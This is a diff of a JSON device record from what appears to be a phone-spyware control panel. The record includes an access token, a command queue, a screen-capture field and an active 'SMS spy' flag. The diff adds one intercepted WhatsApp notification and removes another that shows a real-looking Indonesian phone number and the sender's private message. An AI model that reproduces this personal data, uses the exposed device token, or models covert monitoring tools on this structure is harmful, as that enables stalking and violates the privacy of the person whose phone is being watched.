@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776922346525,
+    "lastSeen": 1776922361681,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Oi: Bot Gc",
+        "content": "👤 Kontak",
+        "time": "23/04 13:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922348202
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "23/04 09:45",
         "pkg": "com.whatsapp",
         "receivedAt": 1776908716923
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 821-4849-9859",
-        "content": "KLO sdh selsai bantu peembersihan kantin ya",
-        "time": "23/04 09:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908716914
       }
     ],
     "galleryPhotos": [],
